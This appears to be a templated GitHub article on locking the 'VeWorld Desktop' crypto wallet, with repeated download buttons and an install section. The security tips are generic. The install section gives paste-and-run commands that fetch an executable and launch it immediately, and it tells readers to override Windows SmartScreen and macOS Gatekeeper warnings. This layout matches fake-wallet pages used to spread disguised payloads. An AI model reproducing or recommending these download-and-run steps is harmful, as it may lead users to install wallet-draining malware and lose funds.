![VeWorld Desktop](../assets/banner-article.png)

# VeChain Wallet Security: Lock on App Switch in VeWorld Desktop

An unlocked session is a signing tool on the desk

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

An unlocked wallet is a signing tool anyone at the keyboard can use, so the question is not whether VeWorld Desktop can lock but how quickly you close that window. Closing the app, locking the machine, and treating the local password as a real credential are the three controls that decide how long an open session stays available.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You step away from the desk with the wallet open, or you work with several applications and switch between them constantly, and you want to know what an unattended session exposes.

| Situation | What an unlocked session allows | What closes it |
|---|---|---|
| You switch to another application | Anything the next person at the desk can click | Closing the app, locking the machine |
| You leave for a few minutes | Signatures, address views, settings | Operating-system screen lock |
| The screen locks automatically | The app stays open behind it | Password on return |
| You close the app | Nothing; the session ends | Reopening requires the password |

## Why it happens

A desktop application's session is not tied to physical presence. Once unlocked, it stays unlocked while the process runs, and the operating system has no way to know that the person who typed the password has walked away. The lock that matters is therefore either the application's own or the machine's.

That is why screen locking is the practical control on a desktop. A machine that locks after a short idle period turns every step away from the desk into a credential check, and it protects everything else on the machine at the same time. It costs nothing and it covers the case the wallet cannot see.

The local password is the second control, and it is stronger than people expect. It decrypts the wallet's stored keys, so a locked app is not merely hidden: the material behind it is encrypted at rest. A weak password makes that protection nominal, which is why the choice of password belongs in this discussion rather than in a settings menu.

Physical conditions matter as much as software. A wallet on an unlocked laptop in a shared office is exposed to whoever sits down next; the same wallet on a machine that locks in a minute is not. The wallet cannot change the environment, so the environment is where the habit has to live, and the habit is cheap: one key combination when you stand up.

## Fix

1. Set the operating system to lock after a short idle period, and lock it manually whenever you stand up.
2. Close VeWorld Desktop when you finish a session rather than leaving it minimised.
3. Use a password unique to this wallet, long enough that guessing is not the cheapest route in.
4. Keep <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">your VeWorld Desktop recovery phrase</a> physically separate from the machine, since an unlocked session does not expose the phrase but a stolen note does.
5. On a shared machine, use a separate operating-system account so the wallet's data directory is not shared.
6. Treat any signature prompt you did not initiate as a sign that someone else has access, and disconnect dApp sessions afterwards.

## If that did not work

If the app stays unlocked after the screen locks, close it before leaving rather than relying on the operating system alone; behaviour differs between platforms and releases.

If you cannot tell whether a session is still open, check the application rather than the taskbar preview, which can show a stale image.

If someone else has used your session, treat it as a compromise: disconnect connected sites, review the transaction history, and move the balance to a fresh wallet if anything looks wrong.

## Prevention

- Lock the machine, not just the app, whenever you leave the desk.
- Close the wallet at the end of a session so the password is required again.
- Keep dApp sessions short-lived and disconnect them when finished.
- Never store the recovery phrase on the same machine as the wallet; keep it offline and never share it.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Does the wallet lock automatically when I switch applications?

A desktop session is not tied to which window is in front, so the reliable control is the machine's own screen lock. Close the app when you are finished rather than depending on window focus.

### Is there an auto-lock setting?

Settings vary between releases, and the dependable habit does not: lock the machine and close the app. That works regardless of what the application offers.

### What can someone do with an unlocked wallet?

Anything the interface allows: read addresses, start a send, approve a dApp request. They cannot see the recovery phrase, which is not held in the session.

### Does locking the app protect the keys on disk?

The password decrypts the stored wallet, so a closed app is protected at rest. A weak password weakens that protection regardless of how often the app is closed.

### Is a shared computer safe for a wallet?

Only with a separate operating-system account and a habit of closing the app. A shared profile shares the wallet's data directory, which is a risk no setting removes.

### What should I do if I think someone used my session?

Disconnect every connected site, review the history, and move the balance to a new wallet if anything is unexplained. An unlocked session is equivalent to handing over the keyboard.

### Does a <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">Ledger paired with VeWorld Desktop</a> change any of this?

It limits the damage: a signature still needs the device and a physical press. It does not stop someone reading addresses or starting flows on your machine.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [What biometric unlock covers](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/biometric-crypto-wallet-unlock-in-veworld-desktop.md)
- [How the password and phrase differ](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/veworld-login-password-and-phrase-veworld-desktop.md)
- [How self-custody protects a balance](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)
- [Pairing a Ledger for signatures](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)
- [Spotting a site that wants your phrase](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/fake-crypto-wallet-app-vs-veworld-desktop.md)